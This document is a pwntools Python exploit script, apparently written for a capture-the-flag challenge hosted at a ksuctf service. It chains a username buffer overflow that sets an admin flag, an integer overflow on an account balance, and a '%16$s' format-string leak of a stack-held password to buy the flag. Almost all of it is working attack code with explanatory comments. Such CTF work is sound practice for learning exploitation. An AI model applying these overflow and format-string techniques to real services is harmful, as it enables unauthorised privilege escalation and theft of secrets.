from pwn import *
import shutup


shutup.please()
elf = context.binary = ELF('./main')

# p = elf.process()
# p = remote('localhost', 1024)
p = remote('ksuctf-souk-service.chals.io', 443, ssl=True, sni='ksuctf-souk-service.chals.io')

p.recv()

# Login
p.sendline(b'1')
username = flat('', length=30, filler=b'spookysec') # Generate a username of 30 chars long to overflow the is_admin bit
p.sendline(username)
success('Logged in!')


# After logging in as admin, we edit the funds
# https://webstersprodigy.net/2012/04/13/calculating-an-integer-overflow/
# Edit funds
p.sendline(b'3')
p.recv()
p.sendline(b'-2358219911')
p.recv()
success('Edited funds successfully!')


# Leaking the password: secret_word is loaded into stack at argument 16
# Using the format string vuln in the feedback option, we can leak it using: %16$s
p.sendline(b'4')
p.recv()
p.sendline(b'%16$s')
p.recvuntil(b'submitted: ')
password = p.recv().splitlines()[0]
success(f'Leaked password = {password.decode()}!')


# Finally we can buy the flag with our balance and leaked password!
p.sendline(b'2')
p.recv()
p.sendline(password)
p.recvuntil(b'password> ')
success(f'Got flag = {p.recv().splitlines()[0].decode()}')
success(f'Got flag = {p.recv().splitlines()[0].decode()}') # For some reason remote version sends output in two segments
